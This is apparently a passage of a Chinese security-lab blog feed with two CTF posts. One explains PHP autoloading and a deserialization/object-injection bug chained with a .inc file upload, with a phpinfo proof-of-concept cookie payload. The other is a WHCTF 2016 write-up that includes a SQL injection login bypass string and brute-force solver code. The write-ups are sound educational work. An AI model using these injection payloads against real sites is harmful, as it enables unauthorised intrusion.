<h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1. 写在前面"></a>1. 写在前面</h3><p>这些漏洞可能在平时很难遇到，但是在CTF以及一些CMS倒是经常看到他们的背影。今天刚刚好手上看到了某CTF的代码，但是并没有获取所有源码，因此修改了部分代码进行分析。</p>
<h3 id="2-自动加载"><a href="#2-自动加载" class="headerlink" title="2. 自动加载"></a>2. 自动加载</h3><h4 id="2-0-为什么要自动加载？"><a href="#2-0-为什么要自动加载？" class="headerlink" title="2.0 为什么要自动加载？"></a>2.0 为什么要自动加载？</h4><p>在面向对象编程中，程序员经常会编写好类然后在一个入口文件中将它们包含进来。如果一个项目非常大，可能存在成百上千个类文件，如果一一包含进去，那么入口文件就会显得特别大并且不利于维护。因此，PHP5提供了一种自动加载机制。</p>
<h4 id="2-1-autoload"><a href="#2-1-autoload" class="headerlink" title="2.1 __autoload"></a>2.1 __autoload</h4><blockquote>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">(<span class="variable">$classname</span>)</span></span>&#123;</span><br><span class="line">	<span class="variable">$class_file</span> = strtolower(<span class="variable">$classname</span>).<span class="string">".php"</span>;</span><br><span class="line">	<span class="keyword">if</span>(file_exists(<span class="variable">$class_file</span>))&#123;</span><br><span class="line">		<span class="keyword">require_once</span>(<span class="string">"$class_file"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"$class_file does not exist!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> File();</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>访问index.php,程序会实例化File类。PHP的解析器会自动调用__autoload()函数。假设当前目录下没有file.php,那么就会输出 “file.php does not exist!” 并且抛出错误。</p>
<blockquote>
<p>file.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"File class is instantiated"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>此时访问index.php,就会得到 “File class is instantiated” 的结果。这样一来，自动加载机制就非常好理解了。</p>
<p>不过,__autoload()最大的问题就是只有一个autoload。举个例子，如果我的项目里面里面引入了其它的文件，而在其它文件里面也定义了autoload，这样就会导致冲突。这样的情况下，spl系列函数就出现了。</p>
<h4 id="2-2-手动调用-spl-autoload"><a href="#2-2-手动调用-spl-autoload" class="headerlink" title="2.2 手动调用 spl_autoload"></a>2.2 手动调用 spl_autoload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void spl_autoload ( string <span class="variable">$class_name</span> [, string <span class="variable">$file_extensions</span> ] )</span><br></pre></td></tr></table></figure>
<ul>
<li>它可以接收两个参数，第一个参数是$class_name，表示类名。第二个参数$file_extensions是可选的，表示类文件的扩展名;如果不指定的话，<strong>它将使用默认的扩展名.inc或.php</strong>。</li>
<li>spl_autoload首先将$class_name变为小写，然后在所有的include path中搜索$class_name.inc或$class_name.php文件(如果不指定$file_extensions参数的话)，如果找到，就加载该类文件。</li>
<li>同样，你可以手动使用spl_autoload(“Person”, “.class.php”)来加载Person类。<strong>实际上，它跟require/include差不多</strong></li>
</ul>
<blockquote>
<p>举个例子</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload(<span class="string">"upload"</span>);</span><br><span class="line"><span class="variable">$F</span> = <span class="keyword">new</span> Upload();</span><br></pre></td></tr></table></figure>
<p>这里没有指定扩展名，那么就会在当前目录下寻找upload.inc或者upload.php并自动加载。其实，到这里而言，和require、include相比并没有简单。相反，它们的功能基本是一模一样的。</p>
<h4 id="2-3-自动调用-spl-autoload"><a href="#2-3-自动调用-spl-autoload" class="headerlink" title="2.3 自动调用 spl_autoload"></a>2.3 自动调用 spl_autoload</h4><p>上面所说的使用手动的方式调用spl_autoload,工作量其实和require/include基本上差不多。调用spl_autoload_register()的时候，如果没有指定欲注册的自动装载函数，则自动注册 autoload 的默认实现函数spl_autoload()。</p>
<blockquote>
<p>举个例子:</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line"><span class="variable">$F</span> = <span class="keyword">new</span> Upload();</span><br></pre></td></tr></table></figure>
<p>此时，程序会在当前路径下自动加载upload.inc或upload.php。</p>
<h3 id="3-对象反序列化"><a href="#3-对象反序列化" class="headerlink" title="3. 对象反序列化"></a>3. 对象反序列化</h3><ul>
<li><p>字符串序列化成类之前，类必须提前声明，否则无法反序列化。</p>
</li>
<li><p>字符串在反序列化的时候，会自动调用__wakeup()魔术方法</p>
</li>
<li><p>Object序列化格式-&gt; O:strlen(对象名):对象名:对象大小:{s:strlen(属性名):属性名:属性值;(重复剩下的元素)}</p>
</li>
</ul>
<h3 id="4-漏洞剖析"><a href="#4-漏洞剖析" class="headerlink" title="4. 漏洞剖析"></a>4. 漏洞剖析</h3><blockquote>
<p>index.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">"act"</span>]) &amp;&amp; preg_match(<span class="string">'/^[a-z0-9_]+$/is'</span>, <span class="variable">$req</span>[<span class="string">"act"</span>])) &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/"</span> . <span class="variable">$req</span>[<span class="string">"act"</span>] . <span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>common.inc.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="variable">$req</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([<span class="variable">$_GET</span>, <span class="variable">$_POST</span>] <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        is_string(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$userinfo</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">"userinfo"</span>]) ? unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"userinfo"</span>]) : [];</span><br></pre></td></tr></table></figure>
<blockquote>
<p>upload.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"error"</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">'size'</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">'size'</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeAccepted</span> = [<span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>];</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"php3"</span>, <span class="string">"html"</span>, <span class="string">"swf"</span>, <span class="string">"htm"</span>];</span><br><span class="line">        <span class="variable">$filearr</span> = pathinfo(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">'type'</span>], <span class="variable">$typeAccepted</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"type error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$filearr</span>[<span class="string">"extension"</span>], <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"extension error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"name"</span>];</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$filename</span>)) &#123;    </span><br><span class="line">            array_push(<span class="variable">$userinfo</span>, <span class="variable">$filename</span>);</span><br><span class="line">            setcookie(<span class="string">"userinfo"</span>, serialize(<span class="variable">$userinfo</span>), time() + <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span>);</span><br><span class="line">            <span class="keyword">echo</span> htmlspecialchars(<span class="string">"upload success, new filename is &#123;$filename&#125; ."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"upload error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"no upload file"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>在common.inc.php中执行了spl_autoload_register()函数，并没有使用参数。</p>
</li>
<li><p>后缀没有禁止.inc的类型</p>
</li>
<li><p>在common.inc.php会反序列化COOKIE中的数据</p>
</li>
<li><p>上传目录在当前目录下</p>
</li>
</ul>
<p>因此我们需要如下构造:</p>
<ul>
<li><p>上传一个名为info.inc的文件，抓包修改MIME类型</p>
</li>
<li><p>info.inc的内容如下所示:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		phpinfo();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改cookie的uesrinfo字段为:O:4:”info”:0:{}</p>
</li>
<li><p>访问index.php即可触发phpinfo()函数。</p>
</li>
</ul>
<h3 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5. 参考资料"></a>5. 参考资料</h3><ul>
<li><a href="http://blog.itpub.net/14883374/viewspace-526720" target="_blank" rel="external">PHP autoload机制详解</a></li>
<li><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">理解php对象注入</a></li>
<li><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li>
<li><a href="http://ecma.io/?p=291" target="_blank" rel="external">小记一次PHP对象注入</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/cain/php.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;最近经常会遇到一些比较有意思的漏洞，比如&lt;strong&gt;PHP反序列化漏洞&lt;/strong&gt;,&lt;strong&gt;PHP对象注入&lt;/strong&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://das.scusec.org/tags/PHP/"/>
    
      <category term="ctf" scheme="http://das.scusec.org/tags/ctf/"/>
    
      <category term="对象注入" scheme="http://das.scusec.org/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="该隐" scheme="http://das.scusec.org/tags/%E8%AF%A5%E9%9A%90/"/>
    
  </entry>
  
  <entry>
    <title>whctf-writeup-all</title>
    <link href="http://das.scusec.org/2016/05/16/whctf-writeup-all/"/>
    <id>http://das.scusec.org/2016/05/16/whctf-writeup-all/</id>
    <published>2016-05-16T07:52:42.000Z</published>
    <updated>2016-08-24T13:29:36.426Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/das/whctf.png" alt=""><br><a href="https://time.xctf.org.cn/ctfs/event/19/tasks" target="_blank" rel="external">地址&gt;&gt;请猛戳&lt;&lt;</a><br><a id="more"></a></p>
<h3 id="Web题"><a href="#Web题" class="headerlink" title="Web题"></a>Web题</h3><p>0x01. 信息</p>
<p>打开是一个代码下载链接，下载下来是wireshark抓的cap包，打开包分析发现两个http的包，get请求下载了zip的压缩包，利用wireshark导出zip包-File-Export Objects-HTTP。发现需要密码打开，官方提示华科官网，解压密码<code>www.hust.edu.cn</code>，flag在flag3.docx中 <!--more --></p>
<p>0x02. 窃取</p>
<p>测试地址存在union注入，利用sqlmap在<strong>wh_ct4_hgduyingjkhjhjg</strong>库中发现flag的提示<code>flag is nothere,but I can tell you the flag is xor user&#39;s password.</code>，那么到<strong>web_sqli</strong>库中，将user1和user2的password异或后解密，得到flag:hust</p>
<p>0x03. 忘了账户和密码</p>
<p>username: <code>&#39; union select 1,2,3-- -</code> , 三列</p>
<p>password: 任意</p>
<p>0x04. find</p>
<p>右键源代码，发现<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css/[adwxhyz]&#123;2&#125;ctf[0-9]&#123;7&#125;.css"</span><br></pre></td></tr></table></figure></p>
<p>前两位字符，后7位数字的正则，大胆猜测前两位是wh，后7位直到官方给了提示（），一个qq号，搜索qq的资料，发现其为1999年5月12的生日，尝试css/whctf1999512.css成功，flag就在里面<code>whctf{Wh3tF_H@rd}</code></p>
<p>0x05. beat it</p>
<p>打开又是一个pcap的包下载，三个ipv4的协议包，尝试重组将中间的丢弃，把data组合hex两次转字符串，得到flag<code>whctf{000 here it is the flag 000}</code></p>
<p>0x06. 密码忘了怎么办？</p>
<p>登录口sql注入，还是union的，注入发现user表有flag字段，将12,13,14,15行的flag字段组合<br><code>whctf{hello$$##itisme&amp;---&amp;&amp;&amp;}</code></p>
<p>0x07. 看图说话</p>
<p>给的提示里ctf页面脚本,猜测存在ctf.php，打开是302跳转，返回包里有张图片链接<br><code>templates/images/xxx/ctf.jpg</code><br>，将图片下载下载利用notepad++打开，flag在最后<code>whctf{today@@isnot09#$tomorrow}</code></p>
<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><p>0x01 我叫李二狗（一）<br>直接base64解密，然后李二狗是近视，将l换成1，x换成1，md5解密</p>
<p>0x02 李二狗的梦中情人<br>将隐藏在图片末尾的链接中的图片提取出来，然后convert转换成png格式，diff下得到一个二维码，二维码黑白反转下，得到正确的二维码，扫一下，bingo</p>
<p>0x03 我叫李二狗（二）<br>给了两个RSA加密，由于其弱密钥，N太小，直接分解大数，破解</p>
<p>0x04 李二狗的LOL战歌<br>听音乐，感觉音频右声道像电报，然后翻译成摩斯编码，直接得到13位字符，然后用ROT13编码转换下，得到flag</p>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>0x01 直接爆破</p>
<p>相关代码<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &#34;stdafx.h&#34;&#10;#include &#34;stdio.h&#34;&#10;#include &#60;string.h&#62;&#10;&#10;int main(int argc, char* argv[])&#10;&#123;&#10;  __int64 seeda=1;&#10;  __int64 lenKey=38;&#10;  __int64 count;&#10;  __int64 k;&#10;  __int64 j;&#10;&#10;&#10;  char key[]=&#34;Just try your best and enjoy yourself!&#34;;&#10;&#10;  __int64 result[]=&#123;157,2400,2215,1971,1732,1527,2053,1878,1988,787,1584,1856,1717,2187,1971,34,1732,1259,1669,1726,1946,1967,1369&#125;;&#10;  for ( count = 0; count &#60; 23; ++count )&#10;  &#123;&#10;    k = key[seeda];&#10;&#9;for ( j = 0; j &#60; 512; ++j )&#10;&#9;&#123;&#10;&#9;&#9;//char s[1];&#10;&#9;//&#9;sprintf(s, &#34;%x&#34;, j);&#10;&#9;&#9;if(strchr(key,j)!=0)&#10;&#9;&#9;&#123;&#10;&#9;&#9;&#9;if(result[count] == (0x10 * j + k) % 0x9C4)&#10;&#9;&#9;&#9;&#123;&#10;&#9;&#9;&#9;&#9;printf(&#34;flag %I64d count-InStr %c\n&#34;,count,j);&#10;&#9;&#9;&#9;&#9;//printf(&#34;%c&#34;,j);&#10;&#9;&#9;&#9;&#9;break;&#10;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#125;&#10;&#9;&#9;else&#10;&#9;&#9;&#123;&#10;&#9;&#9;&#9;if(result[count] == (j ^ (k &#60;&#60; seeda)) % 0x9C4)&#10;&#9;&#9;&#9;&#123;&#10;&#9;&#9;&#9;&#9;printf(&#34;flag %I64d count-OutStr %c\n&#34;,count,j);&#10;&#9;&#9;&#9;&#9;break;&#10;&#9;&#9;&#9;&#9;//printf(&#34;%c&#34;,j);&#10;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#125;&#10;&#10;&#9;&#125;&#10;&#9;seeda = (seeda + 5) % lenKey;&#10;  &#125;&#10; return 0;&#10;&#125;</span><br></pre></td></tr></table></figure></p>
<p>flag <code>whctf{you_are_the_best}</code></p>
<h3 id="revserse"><a href="#revserse" class="headerlink" title="revserse"></a>revserse</h3><p>0x03. 定位坐标</p>
<p>安装Crackme_3.apk运行，发现与之前阿里的比赛题很像，任意输入后查看Log日志，打印出了table信息和pw:亡丸凡亡丸凡义义凡么么门凡广义凡之，利用这两个信息，调用apk中的解密函数aliCodeToBytes(String paramString1, String paramString2)，即可直接打印出结果：30-30-55-114-25-6，加上whctf{}就是flag了。</p>
<p>0x06  我讨厌数学<br>拿到题目首先用IDA得到反汇编代码，通过一系列的分析得出是一个纯粹的矩阵运算，矩阵为6×6的矩阵，其中有9个1，其余的26个为我们输入的FLAG。该算法就是A×AT=P（P在程序中硬编码的，可以直接得到），然后反求A矩阵，P矩阵为：<br>12027h,   0F296h,   0BF0Eh,   0D84Ch,   91D8h,   297h,<br>0F296h,   0D830h,   0A326h,   0B010h,   7627h,   230h,<br>0BF0Eh,   0A326h,   8FEBh,    879Dh,    70C3h,   1BDh,<br>0D84Ch,   0B010h,   879Dh,    0B00Dh,   6E4Fh,   1F7h,<br>91D8h,    7627h,    70C3h,    6E4Fh,    9BDCh,   15Ch<br>297h,     230h,     1BDh,     1F7h,     15Ch,    6<br>然后由“6”可得A中的最后一行全为“1”，再把whctf{xxx}格式转成10进制带进去可得第一行就为“whctf{”，并且根据最终的P矩阵验证正确。然后还有3个1的位置不确定，根据FLAG猜想它们就放在第五行的后三个，然后计算第五行的前两个数字为“114”，“104”。然后根据第一行和第五行的乘积的和来确定它们两个的位置就为“114”，“104”。字母为“t”,”h”。那么现在就还有三行不知道了，所以就爆破。<br>爆破的关键是利用已知的三行去求未知的三行，下面两行来求这三行的可能值，于是写了个脚本试了一下发现求出的结果实在太多了，想了想之后就加上第一行来验证。下面为爆破的java代码：</p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class whctf&#123;&#10;&#9;public static void main(String[] args )&#123;&#10;&#9;&#9;for(int i1=32; i1&#60;129; i1++)&#123;&#10;&#9;&#9;&#9;System.out.printf(&#34;new i1 is: %d\n&#34;,i1);&#10;&#9;&#9;&#9;for(int i2=32; i2&#60;129; i2++)&#123;&#10;&#9;&#9;&#9;&#9;for(int i3=32; i3&#60;129; i3++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;for(int i4=32; i4&#60;129; i4++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;for(int i5=32; i5&#60;129; i5++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;for(int i6=32; i6&#60;129; i6++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;int i7=i1+i2+i3+i4+i5+i6;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;int i8=i1*116+i2*104+i3*125+i4+i5+i6;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;int i9=i1*119+i2*104+i3*99+i4*116+i5*102+i6*123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;if(i7==560 &#38;&#38; i8==30247 &#38;&#38; i9==62102)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;System.out.printf(&#34;THE TWO LINE i1,i2,i3,i4,i5,i6: %d,%d,%d,%d,%d,%d\n&#34;,i1,i2,i3,i4,i5,i6);&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;if(i7==445 &#38;&#38; i8==28867 &#38;&#38; i9==48910)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;System.out.printf(&#34;THE THREE LINE i1,i2,i3,i4,i5,i6: %d,%d,%d,%d,%d,%d\n&#34;,i1,i2,i3,i4,i5,i6);&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;if(i7==503 &#38;&#38; i8==28239 &#38;&#38; i9==55372)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;System.out.printf(&#34;THE FOUR LINE i1,i2,i3,i4,i5,i6: %d,%d,%d,%d,%d,%d\n&#34;,i1,i2,i3,i4,i5,i6);&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#125;&#10;&#10;&#9;&#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
</code></pre><p>但是跑了半小时之后发现解出的结果每一行都有很多解，于是就想着人工过滤这些字符串，判断每一组的前三个字符是否可能为FLAG，于是就每一组列出一个字符串，之后发现一个字符串可能是FLAG，前三个字符为“3_g”，于是就把这组解的所有字符串列出来，得到“3_g00d”字符串，就是我们A矩阵的第三行了，然后同样的原理来过滤第四行和第二行。就得到了FLAG为：<code>whctf{Y0u_ar3_g00d_a7_m4th}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/das/whctf.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://time.xctf.org.cn/ctfs/event/19/tasks&quot;&gt;地址&amp;gt;&amp;gt;请猛戳&amp;lt;&amp;lt;&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://das.scusec.org/tags/ctf/"/>
    
      <category term="das" scheme="http://das.scusec.org/tags/das/"/>
    
      <category term="lab" scheme="http://das.scusec.org/tags/lab/"/>
    
  </entry>
  
</feed>
